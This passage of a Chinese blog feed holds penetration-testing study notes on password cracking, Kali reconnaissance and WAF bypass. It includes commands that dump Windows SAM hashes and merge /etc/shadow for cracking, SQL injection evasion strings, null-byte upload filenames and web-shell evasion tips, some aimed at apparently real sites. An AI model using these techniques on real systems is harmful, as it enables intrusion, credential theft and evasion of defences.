Finnigan的Oracle扫描工具清单--www.petefinnigan.com/tools.htm        QualysGuard--www.qualys.com        SQLPing3--www.sqlsecurity.com/Tools/FreeTools/tabid/65/Default.aspx    漏洞攻击工具            Metasploit        Milw0rm    通用搜索工具        AfriNIC--www.afrinic.net        APNIC--www.apnic.net        ARIN--https://ws.arin.net/whois/index.html        Bing--www.bing.com        DNSstuff--www.DNSstuff.com        dnstools.com--www.ndstools.com        文件扩展名资源--http://filext.com        Google        政府域名--www.dotgov.gov        Hoover`s企业信息--www.hoovers.com        LACNIC--www.lacnic.net        军事域名--www.nic.mil        Netcraft的What`s that site running?--www.netcraft.com        RIPE网络协调中心--www.db.ripe.net/whois        Switchboard.com--www.switchboard.com        .......        (314-325，location:phone) 《黑客达人迷》摘录标签： 字典黑客2014-03-24 14:00 655人阅读 评论(0) 收藏 举报 分类： 逆向与破解（1）  版权声明：本文为博主原创文章，未经博主允许不得转载。(一)字典文件：1.ftp://ftp.cerias.purdue.edu/pub/dict2.ftp://ftp.ox.ac.uk.pub/wordlists3.http://packetstormsecurity.nl/Crackers/wordlists4.www.outpost9.com/files/WordLists.html5.http://rs159.rapidshare.com/files/184075601/BlackKnightList.rar前面的4个站点均稍微有点卡，不过能够下载，Linux环境使用第5个发现链接错误，可能取消了。(二)彩虹表1.http://ophcrack.sourceforge.NET//彩虹表破解工具2.http://project-rainbowcrack.com//彩虹表下载(三)Windows密码工具：1.pwdump3(用来从WindowsSAM数据库中提取密码散列)2.John the Ripper(用来破解Windows和linux/Unix密码的散列)步骤：1.C盘下创建passwords目录2.从www.openwall.com/passwords/dll/pwdump/pwdump3v2.zip下载文件3.从www.openwall.com/john下载文件4.运行：c:\passwords\pwdump3 &gt; cracked.txt，将WindowsSAM密码散列重定向到cracked.txt文件中。5.运行：c:\passwords\john cracked.txt，利用john the ripper破解散列破解时间由字典及密码复杂度等情况决定(四)Unix密码前提：需要对系统、密码(/etc/passwd)文件和shadow密码(/etc/passwd)文件具有root访问权限。1.从www.openwall.com/john下载Unix版源文件2.输入：tar -zxf john-1.7.1.tar.gz3.进入提取该程序时创建的/src目录，输入：make generic4.进入/run目录，并输入：./unshadow /etc/passwd /etc/shadow &gt; cracked.txt，使用unshadow程序将passwd文件盒shadow文件合并，并将其复制到cracked.txt文件中。5.输入：./john cracked.txt 开始破解PS：1.使用John the Ripper的Windows版或DOS版，可在Windows系统上破解UNIX密码。2.并不是在所有的UNIX变体中都适用。(五)BIOS密码厂商默认BIOS密码：http://www.cirt.net/passwords(六)Google_Hackinghttp://johnny.ihackstuff.com/ghdb/Google攻击数据库http://ghh.sourceforge.Net/</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;道德黑客攻击（ethical hacking）
融合了渗透测试、白帽黑客攻击和漏洞测试

1.基础
2.攻击：社工攻击和破解
3.攻击网络
4.攻击操作系统：漏洞扫描
5.攻击应用程序：绕过防火墙、入侵监测系统和杀毒软件
6.结果
7.三个十项
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记33-kaliWEB漏洞扫描</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B033-kaliWEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记33-kaliWEB漏洞扫描/</id>
    <published>2018-09-10T23:53:51.000Z</published>
    <updated>2018-09-10T15:54:22.754Z</updated>
    
    <content type="html"><![CDATA[<pre><code>***w3af***w3af是web application attack and audit framework(web应用攻击和安全审计框架)的缩写它是一个开源的web应用安全扫描器和漏洞利用工具两种使用方式:一种图形界面二种是命令行</code></pre><a id="more"></a>    <pre><code>apt -get install man //直接通过网络下载软件指定软件源怎么指定呢?vi /etc/apt/sources.list  国内快一些国外的话,要翻墙reg:www.youtube.comLinux可以用ss来连接shadowsocks-master.zip  用百度-&gt;shadownsocks来搜索unzip shadowsocks-master.zipcd shadowsocks-master/python setup.py install --安装建立configjson的配置文件用vi编辑cat config.jsonvi config.jsonwww.uudaili.net 关注微信平台 发送2 可以回复用户名,密码 可以试用4个小时www.uudili/org/free.html配置一下就好了然后运行sslocal -c config.json -d start浏览器需要安装一个插件-&gt;Add-ons-&gt;搜索里写autoproxy安装一个就可以了,一个小福字打开-&gt;edit-&gt;Name,Host,Port,socks5-&gt;OK右边的下拉三角选择When not matching:ss2(Name)点击启动它,变红色就可以了https://www.youtube.com代理之后速度就快了要更新w3af才能在kali2.0使用w3af官网git clone --depth 1 https://github.com/andresriancho/w3af.gitcd w3af./w3af_gui//14:54</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;***w3af***
w3af是web application attack and audit framework(web应用攻击和安全审计框架)的缩写
它是一个开源的web应用安全扫描器和漏洞利用工具
两种使用方式:
一种图形界面
二种是命令行
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记32-kaliWEB漏洞扫描</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B032-kaliWEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记32-kaliWEB漏洞扫描/</id>
    <published>2018-09-10T23:46:39.000Z</published>
    <updated>2018-09-10T15:53:24.747Z</updated>
    
    <content type="html"><![CDATA[<pre><code>电脑配置:32G内存 DDR4 2300HZi71T固态--&gt;mac pro会更快,2-3万都未必有这效果--&gt;准系统,配置比较高,但是价钱还可以的系统工具型网站:searchdns.netcraft.comnetcraft.com站长工具http://tool.chinaz.com/http://www.aizhan.com/爱站网Google hackershodan.io</code></pre><a id="more"></a>    <pre><code>百度-&gt;www.ip138.com百度-&gt;微步在线百度-&gt;https//www.shodan.io  安装这个插件就好了  要挂vpn访问shodan要注册账号,显示内容才会完整.shodan:搜索hostname:baidu.comshodan:搜索ip:221.2.43.242 或 221.2.43.0/24shodan:搜索port:23 country:CN city:jinanshodan新手指南:blog.csdn.net/wyvbboy/article/details/53464101cmd-&gt;telnet +ipuser:ciscopassword:cisco  试一下看是不是windows,有没有windows的信息综合扫描:DMitry(deepmagic Information Gathering Tool)是一个一体化的信息收集工具,它可以用来收集以下信息:1.端口扫描2.whois主机IP和域名信息3.从Netcraft获取主机信息(国外网站)4.子域名5.域名中包含的邮件地址尽管这些信息可以在Kali中通过多种工具获取,但是使用DMitry可以将收集的信息保存在一个文件中,方便查看dmitry -wnpb cracer.comdmitry -winse cracer.com扫描网站注册信息dmitry -p cracer.com -f -b 查看主机开放端口//直接在linux输入dmitry可以查看语法REcon-ng与MSF的使用方法非常类似,插播一下msf使用基础流程.第一步,search name模块第二步,use name模块第三步,info查看模块信息第四步,show payloads查看该模块可以使用的攻击载荷(为scanner的时候不需要)第五步,set payload载荷第六步,show targets查看该攻击载荷使用的系统类型(为scanner的时候不需要)第七步,set targets num 设置目标的系统类型search baiduuse +Recon下的语句show optionsset SOURCE baidu.com  设置攻击目标run(相当于搜索子域名)搜集到信息之后选择reporting/csvuse reporting/csvruncat results.csv也可以公司职员信息收集,域名信息收集服务器漏洞扫描:针对于web服务器的各种漏洞扫描工具的使用展开学习skipfish是一款web应用安全侦查工具,skipfish会利用递归爬虫和基于字典的探针生成一副交互式网站地图,最终生成的地图绘制通过安全检查后输出.使用方法:skipfish -o(输出位置) -w/-s (字典文件位置)(目标网站)扫描结束后查看输出文件即可..vegavega是一个安全测试工具,用来爬取一个网站,并分析页面内容来找到链接和表单参数(也可以设置代理)# vegafile-&gt;重置工作台,1.直接扫描:红色按钮-&gt;输入网址/或者可以选择过滤不爬哪些目录,如果有补丁用户的可以添加cookie也可以移出某些cookie,finish.点击scaner-&gt;yes红色是高危,cross-site script include(跨站请求)2.代理扫描:Mantra代理用插件就好,http://burp-&gt;CA Certificate(证书)保存文针对https:然后Mantra-&gt;选项,高级,加密,查看证书,服务器,导入证书-&gt;找到PortSwigger CA-&gt;编辑信任.信任此证书,以及此证书可以标识web站点.就可以https//www.baidu.com的https的包了vega-&gt;右侧Proxy-&gt;左侧Window-&gt;Preferences首选项可以设置代理,可以复制自己想要的代理,然后override client User-AgentPrevent browser caching,不用缓存的意思Prevent intermediate(proxy) caching  擦除代理缓存都可以勾选.Listener:Scanner:OK打开浏览器-&gt;首选项-&gt;启用设置好的代理.vega的上方File下面有个start按钮,开启它浏览器:http://www.qufutuan.com工具抓到后,点击start一栏的倒数第二个,进行扫描***w3af***w3af是web application attack and audit framework(web应用攻击和安全审计框架)的缩写它是一个开源的web应用安全扫描器和漏洞利用工具两种使用方式:一种图形界面二种是命令行Linux关闭代理:浏览器-&gt;Preferences-&gt;Advanced-&gt;Network-&gt;Settings-&gt;Use system proxy settings打开:Manual proxy configuration 127.0.0.1 8888niktoNikto是一款开放源代码的,功能强大的WEB扫描评估软件,能对web服务器多种安全项目进行测试的扫描软件,去寻找已知有名的漏洞,能在230多种服务器上扫描出2600多种有潜在危险的文件,CGI及其他问题,它可以扫描指定主机的WEB类型,主机名,特定目录,COOKIE,特定CGI漏洞,返回主机允许的http模式等.它也使用LibWhiske库,但通常比Whisker更新的更为频繁.Nikto是网管安全人员必备的WEB审计工具之一.-h 指定扫描的目标 -p 端口 nikto -h www.xiaojin.org -T 9nikto -h www.xiaojin.org -p 80,8080,8001 -o 指定输入结果-C 指定CGI目录 -all表示猜解CGI目录  nikto -h www.xiaojin.org -o result.txtnikto -h www.xiaojin.org -C all-T选项包含很多小选项 -T 9表示扫描SQL注入漏洞.nikto -h http://www.qufutuan.com -o -T c /root/qu.txt </code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;电脑配置:
32G内存 DDR4 2300HZ
i7
1T固态
--&amp;gt;mac pro会更快,2-3万都未必有这效果
--&amp;gt;准系统,配置比较高,但是价钱还可以的系统


工具型网站:
searchdns.netcraft.com
netcraft.com
站长工具
http://tool.chinaz.com/
http://www.aizhan.com/爱站网
Google hacker
shodan.io
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记31-kali安装信息收集</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B031-kali%E5%AE%89%E8%A3%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记31-kali安装信息收集/</id>
    <published>2018-09-10T23:45:31.000Z</published>
    <updated>2018-09-10T15:45:58.947Z</updated>
    
    <content type="html"><![CDATA[<pre><code>web高级渗透测试工程师kali安装-信息搜集-服务器扫描Kali Linux前身是BackTrack(基于ubuntu)是一个基于Debian的Linux发行版,包含很多安全和取证方面的相关工具.支持ARM架构Kali Linux是基于Debian的Linux发行版,设计用于数字取证和渗透测试和黑客攻防.由Offensive Security Ltd维护和资助.最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成,BackTrack是他们之前写的用于取证的Linux发行版.Kali Linux预装了许多渗透测试软件,包括nmap(端口扫描器),Wireshark(数据包分析器),John the Ripper(密码破解器),以及Aircrack-ng(一套用于对无线局域网进行渗透测试的软件).用户可通过硬盘,live CD或live USB运行Kali Linux.Metasploit的Metasploit Framework支持Kali Linux.Metasploit一套针对远程主机进行开发和执行Exploit代码的工具.取证可以电子取证,逆向可以逆向,无线可以无线.kali-tools/tools_zh.html:对kali工具包的中文翻译</code></pre><a id="more"></a>    <pre><code>Kali-系统安装u盘安装win32 Disk Imager改引导启动即可(之前是写到光盘里面,通过光盘引导,直接用)(u盘的话8G就够了)Kali-安卓系统安装Linux deploy ssh vnc安装(三个工具包,deploy用来下载kali镜像的,ssh终端连接界面,vnc是连接图形界面的)设置源iphttp://202.141.160.110/kali(如果安到安卓的话)(这个ip源下载下来是4G的,而且里面没有工具)连接配置安装软件即可获取Kali,官网,download 32bit就行Torrent是先下载种子,,ISO是直接下载镜像下面还有人家直接安装好的.kali image downloadlight版本(轻量级)一般不用,用完整版iso安装VM-&gt;新建-&gt;典型-&gt;下一步-&gt;xuanDebian 7.x-&gt;路径-&gt;硬盘大小:(如果只用里面工具的话,10G)-&gt;内存2G-&gt;如果要破解无线的话要保留USB(USB无线网卡)CD:ISO安装镜像启动VMInstalllive(686-pae):直接引导安装硬盘用install选中文就行(网络尽量不要使用.net,用Vmnet1)(net会自动更新系统)主机名:kali域名:回车root密码:root分区方法:(真实机:1.一个新系统点第一个.2.留20G的空空间给它)这里点第一个整个硬盘将所有文件放同一分区分区写入磁盘-&gt;yes安完之后接下来安装工具,然后快照是否使用网络镜像:这里要点no将GRUB安装到MBR上:yes选择/dev/sda结束安装:点击&lt;继续&gt;安装VMTools打开终端df -T    看是否有挂载cd /media/cdrom0lstar -zxvf VM...tar.gz -C /root  最后是指定解压目录安装之后,cdcd vm..././vm..pl回车回车回车回车回车安完之后 reboot重启安装过程完毕信息收集:robots.txt文件whois查询DNS查询敏感目录端口探测整站识别waf探测工具网站及Google hackerrobots.txt获取网站隐藏敏感目录活文件reg:安装目录,上传目录,编辑器目录,管理目录,管理页面等.whois搜集:搜集注册人信息,电话,邮箱,姓名,地址,等相关有用的敏感信息.常用工具:whois和站长工具爱站网whois  不需要输入www,直接域名whois反查:通过注册人信息,邮箱等 查其他域名百度-&gt;社工库百度-&gt;免费社工库百度-&gt;微步在线(weibuzaixian)reg:可视化分析-&gt;节点情报社区DNS搜集:搜集网站域名信息,如子域名,其他域名,解析服务器,区域传送漏洞等.常用工具:dnsenum,dig,fierceDNS信息搜集:dnsenum可以通过字典或者谷歌猜测可能存在的域名,并对一个网段机进行反查.dnsenum -enum cracer.com获取其他域名-r 允许用户设置递归查询-w 允许用户设置whois请求-o 允许用户指定输入文件位置reg:dnsenum --enum qufutuan.comVM8网卡能ping通Trying Zone Transfers and getting Bind Versions:(区域文件传输漏洞)区域文件传输漏洞:dns解析,主dns,还有一个辅助dns 如果访问频繁的话,主dns忙不过来,就必须有辅助dns.辅助dns接收主服务器的区域传输.(如果没有做验证的获取主服务器的域名,这样漏洞就产生了)fierce工具主要是对子域名进行扫描和收集信息的.使用fierce工具获取一个目标主机上所有ip地址和主机信息.还可以测试区域传送漏洞.fierce -dns baidu.com 获取其他域名--wordlist 指定字典fierce -dns ns9.baidu.com --wordlist host.txt/tmp/12.txtreg:首先出来dns服务器.然后zone:探测区域传送漏洞performing  爆破百度的子域名.ls /usr/share/fierce/出现hosts.txtwc -l /usr/share/fierce/hosts.txtdig工具也是一款比较流行的dns侦查工具dig www.cracer.com 查询dnsdig -t ns cracer.com 找解析域名的授权dnsdig axfr @ns1.dns.net cracer.com目录扫描:暴力破解:暴力破解的方法就是需要一个强大的目录名称字典,用来尝试逐个匹配,如果存在通过响应码回显来确定目录或者页面是否存在目录爬行:目录爬行原理是通过一些自带网络蜘蛛爬行的工具对网站链接进行快速爬行.目录扫描:目录暴力破解工具:dirb工具是一款非常好用的目录暴力破解工具,自带强大字典.dirb http://www.cracer.comdirb https://www.baidu.comdirb http://www.cracer.com /usr/wordlist.txtkali安装目录:/usr/share/名称/usr/share/dirb/wordlists/xxx.txt一堆字典FOCA网站元素搜集工具,一款不错的利器,可以在渗透测试中搜集下网站目录中一些敏感文件,用法简单实用.下载直接使用即可.evil-foca目录暴力破解工具:dirbuster工具是一款非常好用的目录暴力猜解工具,自带强大字典图形界面输入https//www.cracer.com配置字典.高级Options里面有过滤,及认证,Autherntication 是认证Http里面比较有用的是:可以借助百度爬行蜘蛛进行欺骗,bypass.txt,复制进来替换掉http user agent,,然后网站就对爬行放行了GO Faster线程太大了,容易把网站烧死.首页:字典:/usr/share/dirbuster/wordlists/xxx.txtSelect starting options:这里第二个选项是说明用下面的加入变量的方式.rreg:/admin/{dir}.aspScan Information 扫描的信息可以挂vpn,也可以go again 谷歌镜像翻墙:1.挂vpn2.ssh3.shadowsock端口探测工具:扫描整个子网,命令如下:#nmap 192.168.1.1/24扫描多个目标,命令如下:#nmap 192.168.1.2 192.168.1.5扫描一个范围内的目标,如下:#nmap 192.168.1.1-100(扫描ip地址为192.168.1.1-192.168.1.100内的所有主机)如果你有一个ip地址列表,将这个保存为一个txt文件.和nmap在同一个目录下,扫描这个txt内的所有主机,命令如下:#nmap -iL target.txt如果你想看你扫描的所有主机的列表,用以下命令:#nmap -sL 192.168.1.1/24扫描除过某一个ip外的所有子网主机,命令:#nmap 192.168.1.1/24 -exclude 192.168.1.1NMAPnmap -sF 192.168.1.1 过防火墙扫描nmap -sL 192.168.1.1 192.168.1.6伪造自己真实ip改为1.1扫描nmap -O -PN 192.168.1.1/24探测网络系统及不用ping探测,可过防火墙拦截.whatweb用来识别网站cms及大家平台环境的工具whatweb http://www.cracer.comwhatweb -v https://www.cracer.com网站服务器+脚本类型+数据库类型+网站容器+cms类型+waf类型waf id 1=1 看是安全狗/云盾/360...wafw00f用来识别网站waf的一款工具wafw00f http://www.cracer.com(不准确)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;web高级渗透测试工程师
kali安装-信息搜集-服务器扫描

Kali Linux前身是BackTrack(基于ubuntu)是一个基于Debian的Linux发行版,包含很多安全和取证方面的相关工具.支持ARM架构

Kali Linux是基于Debian的Linux发行版,设计用于数字取证和渗透测试和黑客攻防.由Offensive Security Ltd维护和资助.最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成,BackTrack是他们之前写的用于取证的Linux发行版.
Kali Linux预装了许多渗透测试软件,包括nmap(端口扫描器),Wireshark(数据包分析器),John the Ripper(密码破解器),以及Aircrack-ng(一套用于对无线局域网进行渗透测试的软件).用户可通过硬盘,live CD或live USB运行Kali Linux.Metasploit的Metasploit Framework支持Kali Linux.Metasploit一套针对远程主机进行开发和执行Exploit代码的工具.

取证可以电子取证,逆向可以逆向,无线可以无线.

kali-tools/tools_zh.html:对kali工具包的中文翻译
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记30-waf绕过详解</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B030-waf%E7%BB%95%E8%BF%87%E8%AF%A6%E8%A7%A3/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记30-waf绕过详解/</id>
    <published>2018-09-10T23:42:55.000Z</published>
    <updated>2018-09-10T15:43:28.578Z</updated>
    
    <content type="html"><![CDATA[<pre><code>WAFWeb Application Firewalf(web安全防火墙)wtf -waf针对脚本黑客拦截的WAF防护原理讲解目标扫描绕过waf手工注入绕过wafsqlmap注入绕过waf编写sqlmap绕过waf脚本过WAF一句话编写详解菜刀连接绕过WAFWebshell上传绕过WAF提权绕过waf</code></pre><a id="more"></a>    <pre><code>and 1=1 正常 1=2 报错 说明有注入漏洞百度:安全狗服务器版,网站版/  .0  -0  .1  绕过安全狗WAF绕过原理讲解:了解waf防护原理查看waf防护位置熟悉防护规则了解防护机制查看拦截时间阈值waf还能拦截cmd,phpinfo等等的函数,中国菜刀一句话拦截资源防护-&gt;...cc攻击防护规则单ip访问上限100次/10秒 冻结5分钟目录扫描绕过waf两种方式:第一:修改客户端ip第二:减慢扫描速度(主要针对100次/10秒)第三:通过代理欺骗waf目标ip信息收集-&gt;OWASP DirBuster-&gt;Options需要一个bypass.txt 让它默认为百度到的爬行蜘蛛手工注入过waf搭建测试环境了解绕过原理熟悉常见绕过构造语句构造绕过测试语句Navicat去连接数据库测试需要在数据库里面测试,要先保证数据库里面能查出来,然后才能拿去前台测试reg:mssqlid=5/*^d^*/and/*^c^*/1=1id=5/*^d^*/and/*^c^*/1=2 报错的话就说明绕过了之前的注入绕过方法:1.大小写变种2.使用SQL注释3.使用URL编码4.使用空字节5.使用嵌套过剥离6.使用非标准入口点7.避开自定义过滤器1.大小写变种and 1=2AnD 1=32.使用注释:union select 1,2,3,3,4,5 from admin注释完/**/union/**/select/**/1,23,44,5,6 from admin/**/un/**/io/**/n/**/sel/**/ec/**/t/**/1,23,45,6, from admin第二种注释:/*!and*/1=2 (效果显著)加入特殊符号在注释里,来干扰waf有些符号加入后数据库能查出数据,但是前台不能正常显示数据url编码正常编码&apos;为%27/ =%2f   *==%2a  %=%25/**/==%252f%%252a*/   还原点击Encoding-&gt;URL decode使用空字节一些过滤器在处理输入时,如果碰到空字节就会停止处理我们通常也会利用空字节进行绕过过滤器如:id=1 %00 and 1=2%00在数据库里面是查不出数据的,必须经过url转码利用嵌套剥离有些过滤器会从用户的输入中进行剥离一些敏感的函数那我们可以通过函数的嵌套进行绕过一次剥离selselectect剥离后select使用非标准入口点说白了就是攻击他的冷门需要自己去挖掘一些连过滤器都没发现的注入点即可避开自定义过滤器一些过滤器它所过滤的字符串都是事先写入写好的只要我们输入的语法和他们过滤打的不匹配即可绕过比如 and转换为 a+nda%nd&apos;a&apos;nd%A0and总结编写绕过语句:利用注释/*^ABC^*/包含关键字/*!/*!/*!union*/变换提交方式将get改为post或者cookie提交reg:/*!40001and*/1=1sqlmap tamper利用symboliclogical.pyspace2mssqlhash.pyappendnullbyte.py利用修改tamper绕过wafsqlmap.py -u &quot;xx.x.x.x.x?id=2&quot;  --delay=1   控制访问时间次数 ,1秒钟延迟sqlmap.py -u &quot;xx.x.x.x.x?id=2&quot;  --delay=1 --tamper=symobliclogical.py  加入插件来跑(cracer博客上讲解了每一个插件是干嘛的)&apos;--dbms&apos;==mysql如果sqlmap跑出来之后,接下来开始跑下面的:sqlmap.py -u &quot;xx.x.x.x.x?id=2&quot;  --delay=1 --tamper=symobliclogical.py --current-db (跑数据库名称)(手工用 order by 19/18) 返回错误/返回正常 跑数据库字段实战编写过waf一句话编写过狗一句话思路利用可变变量$a=b$b=c$$a=c利用函数利用判断语句利用编码突破waf拦截菜刀连接可以使用最新版菜刀中国蚁剑客户端可以使用过狗菜刀+中转脚本上传绕过waf上传突破禁止上传php文件第一:文件包含第二:双文件上传突破限制第三:修改上传参数代理抓包,send to repeaterconnection: close(修改它下面的一句话)reg1:--WebKit....(后面随便改)reg2:filename=&quot;2p.php%00.png&quot;reg3:fo+rm-data;reg4: name--&gt;NAME=&apos;upfile&apos;提权过waf通过程序读密码利用waf绕过神器利用exp读hash讲用户添加到远程桌面组,并且给目录降权利用第三方软件提权干掉waf必须要在驱动层,不是在应用层,来干掉,得用c写</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;WAF
Web Application Firewalf(web安全防火墙)

wtf -waf

针对脚本黑客拦截的

WAF防护原理讲解
目标扫描绕过waf
手工注入绕过waf
sqlmap注入绕过waf
编写sqlmap绕过waf脚本
过WAF一句话编写详解
菜刀连接绕过WAF
Webshell上传绕过WAF
提权绕过waf
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
